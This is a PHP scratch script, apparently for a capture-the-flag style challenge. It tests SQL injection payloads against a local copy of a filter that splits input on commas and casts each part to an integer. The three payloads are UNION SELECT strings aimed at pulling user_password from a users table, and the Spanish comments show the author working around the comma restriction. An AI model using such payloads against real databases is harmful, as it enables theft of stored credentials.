<?php
// SQLite permite usar espacios en lugar de comas? No.
// Necesito exactamente 3 columnas. Déjame pensar en otra forma...

// ¿Qué tal si uso CHAR() o HEX() para construir sin comas?
// O uso||para concatenar

$payloads = [
    // Intentar solo listar con espacios no funciona en SQL
    // Usar CHR no existe en SQLite, pero existe ||
    "0,0,1)) UNION SELECT user_password||x'2c'||0||x'2c'||0 FROM users--",
    
    // Más simple: solo un registro falso + el password
    "0,0,1) UNION SELECT * FROM users WHERE user_id=0--",
    
    // Sin el segundo paréntesis cerrado
    "0,0,1) UNION SELECT * FROM users--",
];

foreach ($payloads as $payload) {
    echo "\n" . str_repeat("=", 70) . "\n";
    echo "Payload: $payload\n";
    echo "Length: " . strlen($payload) . " chars\n";
    
    if (strlen($payload) > 70) {
        echo "❌ TOO LONG!\n";
        continue;
    }
    
    $tmp = explode(',', $payload);
    echo "Parts: " . count($tmp) . "\n";
    
    for ($i = 0; $i < count($tmp); $i++) {
        $tmp[$i] = (int)$tmp[$i];
        if($tmp[$i] < 1) {
            unset($tmp[$i]);
        }
    }
    
    $selector = implode(',', array_unique($tmp));
    echo "Selector: '$selector'\n\n";
    
    $query = "SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (" . $selector . "));";
    echo "Query:\n$query\n";
}
?>
